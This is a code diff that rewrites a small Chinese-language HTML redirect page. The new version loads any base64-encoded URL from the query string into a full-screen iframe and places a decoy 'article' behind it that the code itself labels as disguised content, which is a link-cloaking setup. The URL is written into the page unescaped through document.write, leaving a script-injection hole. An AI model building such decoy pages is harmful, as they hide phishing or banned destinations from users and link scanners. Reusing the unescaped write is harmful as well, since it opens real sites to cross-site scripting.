@@ -1,29 +1,25 @@
 <!DOCTYPE html>
 <meta charset="utf-8">
-<title>加载中</title>
-<style>body{background:#fff;margin:0;padding:20px;text-align:center;color:#666;font-size:14px;}</style>
-
+<title>文章详情</title>
+<style>
+  body { margin: 0; padding: 0; }
+  iframe { width: 100%; height: 100vh; border: none; }
+  .fake-content {
+    position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+    background: #fff; z-index: -1;
+  }
+</style>
 <script>
-// 从网址参数里取 base64 并跳转
-function getQuery(name) {
-  let reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
-  let r = window.location.search.substr(1).match(reg);
-  return r ? decodeURIComponent(r[2]) : "";
-}
-
-function base64UrlDecode(str) {
-  str = str.replace(/-/g, "+").replace(/_/g, "/");
-  while (str.length % 4) str += "=";
-  return decodeURIComponent(escape(atob(str)));
-}
-
-let b64 = getQuery("url");
-if (b64) {
-  let realUrl = base64UrlDecode(b64);
-  window.location.replace(realUrl);
-} else {
-  document.body.innerHTML = "请在网址后加上 ?url=base64编码";
+function getQuery(k){return new URLSearchParams(location.search).get(k)}
+let b64=getQuery("url");
+if(b64){
+  let u=decodeURIComponent(atob(b64));
+  document.write('<iframe src="'+u+'"></iframe>');
 }
 </script>
-
-<body>页面加载中，请稍候...</body>
+<body>
+  <div class="fake-content">
+    <h1>文章标题</h1>
+    <p>这里是伪装的文章内容...</p>
+  </div>
+</body>
